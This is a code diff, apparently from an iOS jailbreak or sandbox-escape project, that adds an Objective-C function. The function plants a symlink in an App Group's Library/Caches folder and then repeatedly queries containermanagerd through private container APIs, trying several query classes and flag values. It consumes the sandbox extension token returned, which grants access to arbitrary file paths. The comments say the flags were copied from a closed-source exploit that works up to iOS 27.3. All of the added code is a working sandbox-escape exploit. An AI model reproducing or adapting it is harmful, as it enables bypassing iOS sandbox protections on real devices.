@@ -146,3 +146,162 @@ void worse_query_release(int64_t handle) {
     sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
     if (release_extension) release_extension(handle);
 }
+
+//
+// ---- 本项目扩展（非上游代码）----
+// 多组 flags 逐个试 + class 2 备用查询。flags 取值观察自一款支持到
+// iOS 27.3 的同类实现（闭源，照思路重写，非拷贝）：
+//  - class 7：0x8100000000 → 0x8000000000 → 0x0800000000
+//    （最后一组即上游默认值；0x0800… 是上游 iOS 26.x 那组）
+//  - class 2：0x8100000000 → 0x8000000000 → 0x40000000 → 0x42000000
+// class 2 的具体路径解析语义没有上游源码可对照，这里沿用与 class 7
+// 相同的 group identifiers + part 3 + 符号链接，真机验证后再说。
+static const uint64_t kClass7Flags[] = {
+    0x0000008100000000ULL,
+    0x0000008000000000ULL,
+    0x0000000800000000ULL,
+};
+static const uint64_t kClass2Flags[] = {
+    0x0000008100000000ULL,
+    0x0000008000000000ULL,
+    0x0000000040000000ULL,
+    0x0000000042000000ULL,
+};
+
+// 用一个查询类别 + 一组 flag 试一次逃逸。成功返回正句柄，失败返回
+// 负数错误码（同 worse_query 的语义）。每次调用都重建符号链接，
+// 避免 containermanagerd 缓存住上一次的解析结果。
+static int64_t wq_attempt(uint64_t query_class, uint64_t flags,
+                          NSString *target, NSString *caches,
+                          NSFileManager *files,
+                          container_query_create_fn query_create,
+                          container_query_set_class_fn query_set_class,
+                          container_query_set_identifiers_fn query_set_group_identifiers,
+                          container_query_set_flags_fn query_set_flags,
+                          container_query_set_part_fn query_set_part,
+                          container_query_get_single_result_fn query_get_single_result,
+                          container_query_free_fn query_free,
+                          container_copy_sandbox_token_fn copy_sandbox_token,
+                          sandbox_extension_consume_fn consume_extension,
+                          NSString *group) {
+    // 符号链接每次都拆了重建，尽量绕开守护进程的解析缓存
+    [files removeItemAtPath: caches error: nil];
+    if ([files createSymbolicLinkAtPath: caches withDestinationPath: target error: nil] == false) {
+        return -4; // Failed to create symlink
+    }
+
+    void *query = query_create();
+    if (!query) return -3; // Failed to create query
+
+    query_set_class(query, query_class);
+    xpc_object_t identifier = xpc_string_create(group.UTF8String);
+    query_set_group_identifiers(query, identifier);
+    query_set_part(query, 3); // part 3 = Library/Caches，路径上吃了上面的符号链接
+    query_set_flags(query, flags);
+
+    void *result = query_get_single_result(query);
+    if (!result) {
+        query_free(query);
+        return -5; // Query rejected by containermanagerd
+    }
+    char *token = copy_sandbox_token(result);
+    if (!token) {
+        query_free(query);
+        return -6; // Kernel refused to issue a sandbox extension
+    }
+
+    int64_t handle = consume_extension(token);
+    query_free(query);
+    free(token);
+    return handle;
+}
+
+int64_t worse_query_escape2(NSString *target, NSString *group, bool create_dir,
+                            bool allow_class2, int64_t *out_last_code,
+                            int *out_last_class, int *out_last_flag_index) {
+    if (out_last_code) *out_last_code = 0;
+    if (out_last_class) *out_last_class = 0;
+    if (out_last_flag_index) *out_last_flag_index = -1;
+
+    // Check if the target exists
+    if (!create_dir) {
+        struct stat st;
+        if (lstat(target.fileSystemRepresentation, &st) != 0) {
+            if (out_last_code) *out_last_code = -255;
+            return -255;
+        }
+    }
+
+    // Get the App Group's path
+    NSFileManager *files = [NSFileManager defaultManager];
+    NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
+    if (!groupRoot) {
+        if (out_last_code) *out_last_code = -1;
+        return -1; // App Group doesn't exist or we can't access it
+    }
+    NSString *caches = [[groupRoot URLByAppendingPathComponent: @"Library/Caches"] path];
+
+    // Resolve functions（与 worse_query 相同的一套）
+    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
+    if (!mgr) {
+        if (out_last_code) *out_last_code = -2;
+        return -2;
+    }
+
+    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
+    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
+    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
+    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
+    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
+    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
+    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
+    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
+    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
+    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
+        dlclose(mgr);
+        if (out_last_code) *out_last_code = -2;
+        return -2; // Failed to resolve a function (unsupported OS)
+    }
+
+    int64_t last = -5;
+    int lastClass = 7, lastIndex = -1;
+
+    // 第一轮：class 7，三组 flags 逐个试
+    for (size_t i = 0; i < sizeof(kClass7Flags) / sizeof(kClass7Flags[0]); i++) {
+        int64_t h = wq_attempt(7, kClass7Flags[i], target, caches, files,
+                               query_create, query_set_class, query_set_group_identifiers,
+                               query_set_flags, query_set_part, query_get_single_result,
+                               query_free, copy_sandbox_token, consume_extension, group);
+        if (h >= 0) {
+            dlclose(mgr);
+            if (out_last_class) *out_last_class = 7;
+            if (out_last_flag_index) *out_last_flag_index = (int)i;
+            return h;
+        }
+        last = h; lastClass = 7; lastIndex = (int)i;
+    }
+
+    // 第二轮：class 2 备用查询（要调用方明确允许，兜 27.3）
+    if (allow_class2) {
+        for (size_t i = 0; i < sizeof(kClass2Flags) / sizeof(kClass2Flags[0]); i++) {
+            int64_t h = wq_attempt(2, kClass2Flags[i], target, caches, files,
+                                   query_create, query_set_class, query_set_group_identifiers,
+                                   query_set_flags, query_set_part, query_get_single_result,
+                                   query_free, copy_sandbox_token, consume_extension, group);
+            if (h >= 0) {
+                dlclose(mgr);
+                if (out_last_class) *out_last_class = 2;
+                if (out_last_flag_index) *out_last_flag_index = (int)i;
+                return h;
+            }
+            last = h; lastClass = 2; lastIndex = (int)i;
+        }
+    }
+
+    dlclose(mgr);
+    clean_symlink(group);
+    if (out_last_code) *out_last_code = last;
+    if (out_last_class) *out_last_class = lastClass;
+    if (out_last_flag_index) *out_last_flag_index = lastIndex;
+    return last;
+}
